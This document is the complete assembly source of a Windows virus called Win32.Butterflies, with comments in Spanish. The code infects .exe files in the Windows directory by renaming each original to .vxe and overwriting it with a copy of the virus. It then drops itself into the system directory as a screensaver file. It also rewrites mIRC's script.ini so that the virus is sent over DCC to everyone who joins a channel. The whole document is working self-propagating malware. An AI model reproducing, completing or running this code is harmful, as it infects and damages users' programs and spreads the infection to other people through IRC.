;Win32.Butterflies By Twizter/NuKe

.386p

.model flat   ;Setting para el Tasm

.code

;=============================

extrn	GetSystemDirectoryA:proc 
extrn	GetWindowsDirectoryA:proc 
extrn	lstrcat:proc 
extrn	ExitProcess:proc 
extrn	GetModuleHandleA:proc 
extrn	GetModuleFileNameA:proc 
extrn	FindFirstFileA:proc 
extrn	FindNextFileA:proc 
extrn	CopyFileA:proc 
extrn	DeleteFileA:proc 
extrn	MoveFileA:proc 
extrn	_lopen:proc 
extrn	_lwrite:proc 
extrn	_lclose:proc 
extrn	WinExec:proc 
extrn	SetFilePointer:proc 
extrn	GetCurrentDirectoryA:proc 
extrn	SetCurrentDirectory:proc 
extrn	_lread:proc 
extrn	_lcreat:proc 
extrn	SetCurrentDirectoryA:proc; Declaramos todas las funciones que vayamos a usar  
;=============================

include windows.inc

;=============================

_off_	equ	2722d
_scrpt_	equ	offset end_script - offset IniData1   ;Declaramos el tamaño del Script.ini

;=============================

begin:
	push	00000001                     ;modo de ejecucion
   	push	offset cFileName             ;nombre del .vxe el cual se guarda en el exe al momento
	call	WinExec                      ; de la infeccion

	push	offset path3                 ;Buffer en donde guaradar el Path
	push	260                          ;Tamaño del buffer
	call	GetCurrentDirectoryA         ;Obtiene el path del programa

	push 	25                           ;Tamaño del buffer
	push 	offset path2                 ;Buffer en donde guaradar el Path
	call 	GetWindowsDirectoryA         ;obtiene el path de windows

      push	offset path2                 
	call	SetCurrentDirectoryA         ;el directorio ahora es el de windows

	push	offset handle1
	call	GetModuleHandleA     ;obtiene el handle del modulo de la fila que se esta ejecutando     

	push 	50                   ;Tamaño del buffer
	push 	offset handle2       ;buffer
	push 	eax           ;handle del ejecutable que acabmos de obtener con la funcion anterior
	call	GetModuleFileNameA    ;guardamos el path de este ejcutable en handle2

	push	offset filedta ;estructura que recibe informacion acerca de los archivos encontrados
	push	offset maska   ; = *.Exe 
	call	FindFirstFileA ;funcion de buscar archivos 

	mov	dword ptr [handle_],eax      ;guarda el hadle de la busqueda en _handle
	cmp	eax,	0                      ;si la funcion devolvio un 0 hubo un error o sea que no
	je	done_this                    ;hay EXEs para infectar .

check:
;     cmp	nFileSizeLow, 6000d          
;    	jle	nextfile
	mov	bx,	word ptr[cFileName]   ;mueve el nombre del archivo encontrado a bx
	cmp	bx,	'XE'              ;mira a ver si empieza por Ex , para no infectar el explorer
	je	nextfile                ;si empieza por ex va por el proximo archivo
	cmp	bx,	'UR'              ;mira a ver si empieza por Ru , para no infectar el RunDllxx
	je	nextfile                ;si empieza por ex va por el proximo archivo
      cmp	bx,	'ur'              ;lo mismo
	je	nextfile                ;igual
	cmp	bx,	'ME'              ;Em , para no infectar el Emm386.Exe
	je	nextfile                ;no lo infecta
	lea	esi,	[cFileName]       ;pone en Esi el nombre del file
	lea	edi,	[newfilename]     ;pone en edi un buffer para guardar el nombre del nuevo file
stowit:
	lodsb                         ;mueve un byte de esi a Al
	cmp	al,	'.'               ;lo compara con el punto
	je	addext                  ; si ya encontramos el punto vamos a la rutina addext
	stosb                         ;mueve el byte an al a Edi
	jmp	stowit                  ;hace un loop hasta encontrar el punto
addext:
	stosb                         ;mueve el "." a Edi
	lea	esi,	[newext]          ;pone en esi la extension vxe 
	movsw                         ;mueve el contenido de Esi (vxe) a Edi
	movsw                         ;mueve el contenido de Esi (vxe) a Edi
	push	0                       ;Flags
	push	offset newfilename      ;nombre con la extension .Vxe
	push	offset cFileName        ;nombre con la extension .Exe
	call	MoveFileA               ;convierte el .exe a . vxe

	push	0                       ;Flag
	push	offset cFileName        ;nombre del .exe
	push	offset handle2          ;nombre del virus que se esta ejecutando
	call	CopyFileA     ;con esta funcion copiamos este virus con el antiguo nombre del .exe

	push	2                 ;Write_Mode
	push	offset cFileName  ;abrimos el .exe "infectado"
	call	_lopen            ;Oopen file


      mov	dword ptr [_handle],eax    ;guarda el handle del archivo abierto

	push	dword 0          ;how to move ; desde el file begin
	push	NULL               
	push	_off_            ;offset a donde mover el puntero del file
	push	eax              ;handle del file 
	call	SetFilePointer   ;movemos el puntero a la posicion donde se escribira el nombre del  
                             ;.vxe 

	mov	eax,	dword ptr [_handle] ;mueve el handle a Eax
	push	50                        ;numero de byes a escribir
	push	offset newfilename        ;bytes que vamos a escribir
	push	eax                       ;handle del file a escribir
	call	_lwrite  ;de esta forma si por ejemplo infectamos write.exe , en el nuevo write.exe
                     ;se guardara el nombre write.vxe para luego ejecutarlo

	push	eax      ;handle del archivo
	call	_lclose  ;close the file 

nextfile:

	push	offset filedta  ;estructura donde guardar la informacion de los archivos encontrados
	mov	eax,	dword ptr [handle_] ;handle de la primera busqueda
	push	eax        
	call	FindNextFileA      ;buscamos el sigueiente exe 

	cmp	eax,	0            ;si no hay mas files 
  	je	done_this          :saltamos a done_this
	jmp	check

done_this:

	push 	25                ;tamaño del buffer
	push 	offset path1      ;buffer donde guardar
	call 	GetSystemDirectoryA ; el directorio system ("C:\Windows\System\")

      push 	offset handle3   ;cadena que contiene "\FlyingButterflies.scr"
	push 	offset path1     ;path de system
	call 	lstrcat          ;juntamos las dos cadenas 

	push	0                ;flag
	push	offset path1     ;nombre que se obtuvo en la funcion anterior
	push	offset handle2   ;nombre de este file ("e.g:Virus.Exe")
	call	CopyFileA        ;movemos el virus al dir. system para mandarlo con Mirc

	push	2                ;flag
	push	offset MircLNK   ;nombre del acceso directo de mirc
	call	_lopen           :lo abrimos

	mov	dword ptr [_handle],eax  ;handle de mirc.lnk en Eax
	push	dword 2
	push	NULL
	push	-50
	push	eax
	call	SetFilePointer    ;nos movemos al offset -50 para ver el path de mirc  
	mov	eax,	dword ptr [_handle]

	push	50
	push	offset MircDir
	push	eax
	call	_lread      ;leemos 50 bytes en donde debe estar el path de mirc

	push	eax
	call	_lclose  ;cerramos el acceso directo  

	std
	lea	esi,	MircIni      ;ponemos en Esi el path de mirc

get_next_byte:
	lodsb                  ;movemos un byte de esi a al
	cmp	al,	':'        ;vemos si ya encontramos los dos puntos
	jne	get_next_byte    ;loop

	push 	offset MircIni   ; = \script.ini
	push 	esi              ;path del mirc
	call 	lstrcat          ;juntamos los dos 

	push	0                ;flag
	push	esi              ;nombre del archivo script.ini
	call	_lcreate         ;creamos o sobreescribimos el file 

	push	_scrpt_          ;numero de bytes a escribir 
	push	offset IniData1  ;contenido del script.ini
	push	eax              ;handle del archivo creado 
	call	_lwrite          ;escribimos el archivo 

	push	eax              ;handle 
	call	_lclose          ;cerramos el archivo

	push	offset path3             ;Path original
	call	SetCurrentDirectoryA     ;restauramos el path del principio

	push	0
	call	ExitProcess              ; y terminamos

;=============================

.data
handle1		db	50 	dup(0)
handle2		db	50 	dup(0)
maska		db	'*.exe',0

newext		db	'vxe',0
handle_		dd	0
_handle		dd	0
filedta:
FileAttributes	dd	0
CreationTime 	db	8	dup(0)
LastAccessTime	db	8	dup(0)
LastWriteTime	db	8	dup(0)
nFileSizeHigh	dd	0
nFileSizeLow	dd	0
dwReserved0	dd	0
dwReserved1	dd	0
cFileName	db	50	dup('N')
cAltFileName	db	14	dup(0)
newfilename	db	50	dup(0)

path2		db	25	dup(0)
path3		db	260	dup(0)
MircLNK		db	'Start Menu\Programs\mIRC\mIRC32.LNK',0
MircDir		db	50	dup(0)

MircIni		db	'\script.ini',0
Mirc_		db	'c:\mirc\script.ini',0
IniData1:
		db	'[Script]',0dh,0ah
		db	'n0=ON 1:JOIN:#:{ /if ( $nick == $me ) { halt }',0dh,0ah
		db	'n1=  /dcc send $nick '
path1		db	25	dup(0)
handle3		db	'\FlyingButterflies.scr',0,'}'
		db	100	dup(0)
end_script:

		
	end	begin